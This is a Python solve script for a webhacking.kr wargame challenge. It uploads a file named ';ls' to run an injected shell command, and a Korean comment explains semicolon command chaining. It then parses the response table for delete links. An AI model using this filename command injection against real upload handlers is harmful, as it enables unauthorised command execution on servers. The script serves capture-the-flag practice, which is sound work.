import requests
from bs4 import BeautifulSoup

PHPSESSID = ''
PROBLEM_URL = 'http://webhacking.kr/challenge/bonus/bonus-12/index.php'
cookies = {
    'PHPSESSID' : PHPSESSID
}
files = {
    # 리눅스에서 세미콜론(;)은 하나의 명령어 라인에서 여러개의 명령을 수행하는 구분자 역할 을 합니다.
    'upfile': (';ls', '', 'text/plain', {
        'Expires': '0'
    })
}

# Content-Disposition: form-data; name="upfile"; filename=";"
# Content-Type: text/plain

r = requests.post(PROBLEM_URL, cookies = cookies, data = {
    'memo': "hey"
},files = files)

# parse the html using beautiful soap and store in variable `soup`
soup = BeautifulSoup(r.text, 'html.parser')

webhackTable = soup.find('table', attrs = {
    'border' : '0'
})

for row in webhackTable.findAll("tr"):
    cells = row.findAll("td")
    delelteLink = cells[4]

    if delelteLink is None:
        print('정상 업로드 안된 듯')
        break

    print('Check out this hyperlink')
    print(PROBLEM_URL + delelteLink.find('a').get('href'))

